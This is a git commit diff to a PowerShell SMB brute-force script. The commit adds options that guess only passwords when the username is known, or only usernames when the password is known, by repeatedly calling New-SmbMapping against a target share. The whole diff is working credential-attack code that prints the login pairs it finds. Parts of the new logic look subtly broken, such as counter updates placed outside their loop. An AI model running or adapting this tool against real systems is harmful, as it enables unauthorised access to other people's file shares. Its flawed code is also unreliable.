481578ef876cbe1b56bc7c8f51ba6dadba5e0de3
oykumelikoglu <oykumelikoglu@gmail.com>
2018-04-01 23:11:15 +0300

    Added -u and -p options
    Known username and known password brute force attacks

--- smbBrute.ps1
+++ smbBrute.ps1
@@ -17,18 +17,24 @@
         Upper bound. The last character to be searched in the Unicode table, as the upper bound. The search does not check character's with higher decimal numbers than upper bound.
 
     -ml: [int, DEFAULT = 1]
-        The password and username's length is increased level by level in order not to be in infinite loop with 1 char password and infinite char password. This is the first level to be reached.
+        Max Length. The password and username's length is increased level by level in order not to be in infinite loop with 1 char password and infinite char password. This is the first level to be reached.
         Ex: If 2 is selected, first the 1 char usernames and 0,1,2 char passwords will be matched then 2 char usernames and 0,1,2 char passwords. Then the level will be increased.
         Ex: If 100 is selected, first the 1 char usernames and 0,1,2..,100 char passwords will be matched... Then the 100 char usernames and 0,1,2..,100 char passwords will be matched. Then the level will be increased.
                 
     -mli: [int, DEFAULT = 1]
-        When the lengths of the password and username is reached, the maximum length is increased with this value.
+        Max Length Increment. When the lengths of the password and username is reached, the maximum length is increased with this value.
 
     -uc: [int[], DEFAULT = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37)]
-        List of characters that are forbidden in the username. ( Usernames can not contain   / \ [ ] : ; | = , + * ? < > % )
+        Username constraints. List of characters that are forbidden in the username. ( Usernames can not contain   / \ [ ] : ; | = , + * ? < > % )
 
     -pc: [int[], DEFAULT = 1 .. 31 ]
-        List of characters that are forbidden in the password.
+        Password constraints. List of characters that are forbidden in the password.
+
+    -u: [String, DEFAULT = null]
+        Username. If the username is known, only the passwords will be brute forced
+
+    -p: [String, DEFAULT = null]
+        Password. If the password is known, only the usernames will be brute forced.
 
 .OUTPUTS
     Generates an output txt file whose name consists of smbBrute and the timestamp.
@@ -47,9 +53,10 @@ param (
   [int] $mli =1, # max length increment
   # Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
   [int[]] $uc = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37), # username constraints , chars that cant be used
-  [int[]] $pc = 1 .. 31 #password constraints , chars that cant be used
-
-) # TODO: Try - catch blocks
+  [int[]] $pc = 1 .. 31, #password constraints , chars that cant be used
+  [String] $u = $null,
+  [String] $p = $null
+) # TODO: Try - catch blocks for params
 
 Start-Transcript -path "smbBrute_$(get-date -f dd.MM.yyyy_HH.mm.ss).txt"
 
@@ -112,7 +119,6 @@ while ($userPtr.Length -le $ml) {
 
     while ($passPtr.Length -le $ml){ #check pass for this user
         $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
-           # TODO: Check if the server is on
         if ( $Result -ne $null ){
             Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
             Write-Host "**************************************************************************"
@@ -144,6 +150,68 @@ $passPtr =  @($lb) * ($OldMaxLength+1) # No need to check previous with the same
 $pass = createString $passPtr
 }
 }
-brute
+function bruteKnownUser{
 
+[int[]]$passPtr =  0 # password can be null
+$pass = createString $passPtr #changes to String
+$Result = $null
+
+#Continue till find a match
+:outer while ($true) {
+     $Result = New-SmbMapping -RemotePath $IPAddr -UserName $u -Password $pass -EA SilentlyContinue
+     if ( $Result -ne $null ){
+        Write-Host "SUCCESS -> User:" $u "PassPtr: " $passPtr "Pass:" $pass
+        Write-Host "**************************************************************************"
+        Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
+        Write-Host "USERNAME: " $u " PASSWORD:" $pass
+        Write-Host "**************************************************************************"
+        break outer
+      }
+        
+      Write-Host "FAILED -> User:" $u "PassPtr: " $passPtr "Pass:" $pass
+      $passPtr = updateList $passPtr $false
+      $pass = createString $passPtr
+    }
+}
+function bruteKnownPass{
+
+[int[]]$userPtr =  $lb
+$user = createString $userPtr #changes to String
+$Result = $null
+
+#Continue till find a match
+:outer while ($true) {
+    $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $p -EA SilentlyContinue
+    if ( $Result -ne $null ){
+        Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "Pass:" $p
+        Write-Host "**************************************************************************"
+        Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
+        Write-Host "USERNAME: " $user " PASSWORD:" $p
+        Write-Host "**************************************************************************"
+        break outer
+     }
+     Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "Pass:" $p
+    }
+    $userPtr = updateList $userPtr $true
+    $user = createString $userPtr 
+}
+
+if ($u -ne $null -and $p -ne $null){
+    $Result = New-SmbMapping -RemotePath $IPAddr -UserName $u -Password $p -EA SilentlyContinue
+    if ( $Result -ne $null ){
+        Write-Host "SUCCESS -> User:" $u "Pass:" $p
+    }
+    else{
+         Write-Host "FAILED -> User:" $u "Pass:" $p
+    }
+}
+elseif ($u -ne $null) {
+    bruteKnownUser
+}
+elseif ($p -ne $null){
+    bruteKnownPass
+}
+else {
+brute
+}
 Stop-Transcript
